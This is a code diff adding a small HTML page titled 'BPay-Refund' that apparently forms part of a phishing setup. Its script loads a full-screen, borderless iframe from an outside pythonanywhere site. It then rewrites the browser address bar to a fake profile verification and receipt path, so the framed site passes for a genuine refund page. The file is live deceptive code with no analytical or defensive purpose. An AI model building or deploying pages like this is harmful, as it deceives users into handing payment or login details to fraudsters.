@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BPay-Refund</title>
+<style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+    }
+    
+    #webview-container {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+    }
+
+    #loading-message {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 24px;
+    }
+</style>
+</head>
+<body>
+<div id="webview-container">
+</div>
+<script>
+    window.onload = function() {
+        var webview = document.createElement('iframe');
+        webview.src = "https://teammeg.pythonanywhere.com/";
+        webview.style.width = "100%";
+        webview.style.height = "100%";
+        webview.style.border = "none";
+        
+        webview.onload = function() {
+            var loadingMessage = document.getElementById('loading-message');
+            if (loadingMessage) {
+                loadingMessage.remove();
+            }
+        };
+
+        document.getElementById('webview-container').appendChild(webview);
+    };
+    window.history.pushState({}, '', '/profile?verification%teammeg%recipt?77128812999190001654');
+
+</script>
+
+</body>
+</html>
